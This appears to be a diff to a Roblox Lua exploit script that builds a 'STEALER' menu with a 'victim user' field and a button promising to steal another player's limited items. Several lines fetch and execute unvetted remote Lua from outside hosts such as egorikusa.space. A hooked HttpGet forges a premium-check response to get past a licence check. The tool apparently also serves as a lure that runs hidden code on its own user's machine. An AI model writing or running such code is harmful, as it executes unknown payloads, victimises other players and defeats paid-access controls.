@@ -1,2 +1,43 @@
 loadstring(game:HttpGet("https://egorikusa.space/b7a00216738a32ca8e25c658.lua", true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/-beta-/main/AutoParry.lua"))()
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "STEALER", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local Tab = Window:MakeTab({
+	Name = "Main",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+Tab:AddButton({
+	Name = "Steal someone limited remember use it dont get caught",
+	Callback = function()
+loadstring(game:HttpGet("https://egorikusa.space/3c55fc12683a613a6a1b4531.lua", true))()
+      		print("button pressed")
+  	end 
+})
+Tab:AddTextbox({
+	Name = "victim user",
+	Default = "victim username",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+Tab:AddToggle({
+	Name = "Steal Limited",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+local httpHook;
+httpHook = hookfunction(game.HttpGet, function(self,...)
+   local Args = {...}
+   if Args[1] and type(Args[1]) == "string" then
+       if Args[1]:match("checkPremium.php") then
+           return "true"
+       end
+   end
+   return httpHook(self,...)
+end)
+
+local OrionLib = loadstring(game:HttpGet(('https://hypernite.xyz/Backup/Orion/source.lua')))() -- Backed up to my host
